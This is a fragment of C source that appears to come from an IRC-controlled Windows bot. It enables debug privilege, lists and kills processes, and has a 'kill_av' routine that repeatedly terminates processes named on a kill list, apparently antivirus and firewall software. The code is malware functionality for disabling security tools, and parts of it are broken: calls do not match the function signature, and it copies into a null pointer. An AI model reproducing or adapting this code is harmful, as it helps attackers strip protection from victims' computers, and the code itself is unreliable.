	if (!LookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1;
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	CloseHandle(hToken);

	return bRet;
}

int listProcesses(BOOL notice, char *proccess, BOOL killthread, BOOL full, char *message)
{
	char sendbuf[BUFFSIZE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = { 0 };
	MODULEENTRY32 me32 = { 0 };

	message = NULL;

	AdjustPrivileges(SE_DEBUG_NAME, TRUE);
	if ((hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcess, &pe32)) {
			while (Process32Next(hProcess, &pe32)) {
				if (killthread) {
#ifndef NO_AVFW_KILL
					for (int c = 0; c < (sizeof(kill_list) / sizeof(LPTSTR)); c++) {
						if (lstrcmpi(pe32.szExeFile, kill_list[c]) == 0) {
							if (hProcess2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID))
								if (!TerminateProcess(hProcess2, 0))
									CloseHandle(hProcess2);

							break;
						}
					}
#endif
				}
				else if (!proccess) {
					hProcess2 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
					me32.dwSize = sizeof(MODULEENTRY32);
					if (full) {
						if (Module32First(hProcess2, &me32))
							sprintf(sendbuf, " %s (%d)", me32.szExePath, pe32.th32ProcessID);
						else
							sprintf(sendbuf, " %s (%d)", pe32.szExeFile, pe32.th32ProcessID);
					}
					else
						sprintf(sendbuf, " %s (%d)", pe32.szExeFile, pe32.th32ProcessID);
					CloseHandle(hProcess2);
				}
				else {
					if (strcmp(pe32.szExeFile, proccess) == 0) {
						hProcess2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						CloseHandle(hProcess);

						if (!TerminateProcess(hProcess2, 0)) {
							CloseHandle(hProcess2);
							message = NULL;
							return 0;
						}
						strncpy(message, sendbuf, BUFFSIZE);
						return 1;
					}
				}
			}
		}
		CloseHandle(hProcess);
	}
	AdjustPrivileges(SE_DEBUG_NAME, FALSE);

	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param)
{
	char sendbuf[BUFFSIZE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf, "[PROC]: Listing processes:");
	// if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);

	if (listProcesses(lproc.notice, NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf, "[PROC]: Process list completed.");
	else
		sprintf(sendbuf, "[PROC]: Process list failed.");

	// if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);

	//clearthread(lproc.threadnum);

	ExitThread(0);
}

int killProcess(int pid)
{
	int ret = 1;

	HANDLE pHandle;

	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) != NULL)
		if (!TerminateProcess(pHandle, 0)) {
			ret = 0;
			CloseHandle(pHandle);
		}

	return ret;
}

#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param)
{
	// Try to kill AV only 3 times
	int count = 3;
	while (count != 0) {
		listProcesses(NULL, FALSE, NULL, TRUE);
		Sleep(killer_delay);
		count--;
	}
	return 0;
}
#endif
#endif